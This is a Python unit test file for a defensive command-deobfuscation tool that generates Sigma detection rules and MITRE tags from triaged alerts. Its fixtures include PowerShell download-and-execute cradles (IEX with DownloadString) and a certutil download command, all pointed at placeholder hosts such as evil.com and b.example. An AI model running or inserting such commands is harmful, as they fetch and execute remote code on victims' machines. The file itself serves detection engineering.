import io
import os
import tempfile
import unittest
import uuid
from contextlib import redirect_stdout
from datetime import date
from cmd_unmask.cli import main as cli_main
from cmd_unmask.models import (
    BehavioralMatch,
    ExtractedIOC,
    PayloadNode,
    Severity,
    SigmaRule,
    TriageVerdict,
    UnpackingDAG,
)
from cmd_unmask.sigma import generate_sigma_rule, render_sigma_yaml


class TestSigmaRuleGenerator(unittest.TestCase):
    def _make_sample_verdict(self) -> TriageVerdict:
        root_node = PayloadNode(
            node_id="node_0",
            text="powershell.exe -enc SQBFAFgA...",
            technique="raw_input",
            depth=0,
        )
        primary_leaf = PayloadNode(
            node_id="node_1",
            text="IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')",
            technique="base64_utf16le",
            depth=1,
            parent_id="node_0",
        )
        dag = UnpackingDAG(root_id="node_0", primary_leaf_id="node_1")
        dag.add_node(root_node)
        dag.add_node(primary_leaf)

        return TriageVerdict(
            source_id="alert-101",
            original_command="powershell.exe -enc SQBFAFgA...",
            primary_unmasked_payload=primary_leaf.text,
            dag=dag,
            severity=Severity.HIGH,
            risk_score=75,
            iocs=[
                ExtractedIOC(
                    ioc_type="url",
                    raw_value="http://evil.com/a.ps1",
                    defanged_value="hxxp://evil[.]com/a[.]ps1",
                    source_node_id="node_1",
                )
            ],
            behavioral_matches=[
                BehavioralMatch(
                    rule_id="RULE-PS-001",
                    name="PowerShell Script Execution",
                    mitre_id="T1059.001",
                    tactic="Execution",
                    weight=30,
                    evidence="IEX",
                    source_node_id="node_1",
                ),
                BehavioralMatch(
                    rule_id="RULE-NET-001",
                    name="Ingress Tool Transfer",
                    mitre_id="T1105",
                    tactic="Command and Control",
                    weight=40,
                    evidence="DownloadString",
                    source_node_id="node_1",
                ),
            ],
        )

    def test_generate_sigma_rule_structure(self):
        verdict = self._make_sample_verdict()
        rule = generate_sigma_rule(verdict, author="Dion (SOC)")

        self.assertIsInstance(rule, SigmaRule)
        self.assertEqual(rule.status, "experimental")
        self.assertEqual(rule.author, "Dion (SOC)")
        self.assertEqual(rule.level, "high")
        self.assertEqual(rule.logsource.get("category"), "process_creation")
        self.assertEqual(rule.logsource.get("product"), "windows")

        # Check deterministic UUIDv5
        parsed_uuid = uuid.UUID(rule.id)
        self.assertEqual(parsed_uuid.version, 5)

        # Verify MITRE tags
        self.assertIn("attack.execution", rule.tags)
        self.assertIn("attack.t1059.001", rule.tags)
        self.assertIn("attack.command_and_control", rule.tags)
        self.assertIn("attack.t1105", rule.tags)

        # Verify detection block has selection keywords
        selection = rule.detection.get("selection", {})
        self.assertIn("CommandLine|contains|all", selection)
        keywords = selection["CommandLine|contains|all"]
        self.assertTrue(any("DownloadString" in k for k in keywords))

    def test_render_sigma_yaml(self):
        verdict = self._make_sample_verdict()
        rule = generate_sigma_rule(verdict)
        yaml_text = render_sigma_yaml(rule)

        self.assertIn("title:", yaml_text)
        self.assertIn(f"id: {rule.id}", yaml_text)
        self.assertIn("logsource:", yaml_text)
        self.assertIn("category: process_creation", yaml_text)
        self.assertIn("product: windows", yaml_text)
        self.assertIn("detection:", yaml_text)
        self.assertIn("selection:", yaml_text)
        self.assertIn("CommandLine|contains|all:", yaml_text)
        self.assertIn("condition: selection", yaml_text)
        self.assertIn("level: high", yaml_text)
        self.assertIn("attack.t1059.001", yaml_text)

    def test_generate_sigma_rule_for_benign(self):
        dag = UnpackingDAG(root_id="node_0", primary_leaf_id="node_0")
        verdict = TriageVerdict(
            source_id="alert-0",
            original_command="dir C:/",
            primary_unmasked_payload="dir C:/",
            dag=dag,
            severity=Severity.BENIGN,
            risk_score=0,
        )
        rule = generate_sigma_rule(verdict)
        self.assertIsNone(rule)

    def test_deterministic_uuid_and_yaml_single_quote_escaping(self):
        verdict = self._make_sample_verdict()
        rule_a = generate_sigma_rule(verdict)
        rule_b = generate_sigma_rule(verdict)
        self.assertIsNotNone(rule_a)
        self.assertIsNotNone(rule_b)
        self.assertEqual(rule_a.id, rule_b.id)
        yaml_text = render_sigma_yaml(rule_a)
        self.assertIn("''http://evil.com/a.ps1''" if "'" in rule_a.title else "CommandLine|contains|all:", yaml_text)

    def test_cli_sigma_stdout_and_sigma_out_file(self):
        cmd = "powershell.exe -NoP -c IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"
        with tempfile.TemporaryDirectory() as tmpdir:
            out_file = os.path.join(tmpdir, "rule.yml")
            buf = io.StringIO()
            with redirect_stdout(buf):
                rc = cli_main(["-c", cmd, "--sigma", "--sigma-out", out_file])
            self.assertEqual(rc, 0)
            stdout_yaml = buf.getvalue()
            self.assertIn("title:", stdout_yaml)
            self.assertIn("category: process_creation", stdout_yaml)
            self.assertTrue(os.path.exists(out_file))
            with open(out_file, "r", encoding="utf-8") as fh:
                self.assertEqual(fh.read(), stdout_yaml)

    def test_cli_sigma_out_directory_batch_export(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            batch_file = os.path.join(tmpdir, "alerts.txt")
            out_dir = os.path.join(tmpdir, "rules")
            with open(batch_file, "w", encoding="utf-8") as fh:
                fh.write("dir C:\\\n")
                fh.write("powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://a.example/1.ps1')\n")
                fh.write("certutil.exe -urlcache -split -f http://b.example/payload.exe C:\\Temp\\p.exe\n")
            buf = io.StringIO()
            with redirect_stdout(buf):
                rc = cli_main(["-f", batch_file, "--sigma", "--sigma-out", out_dir])
            self.assertEqual(rc, 0)
            self.assertIn("---\n", buf.getvalue())
            exported = sorted(os.listdir(out_dir))
            self.assertEqual(len(exported), 2)
            self.assertTrue(all(name.endswith(".yml") for name in exported))


if __name__ == "__main__":
    unittest.main()
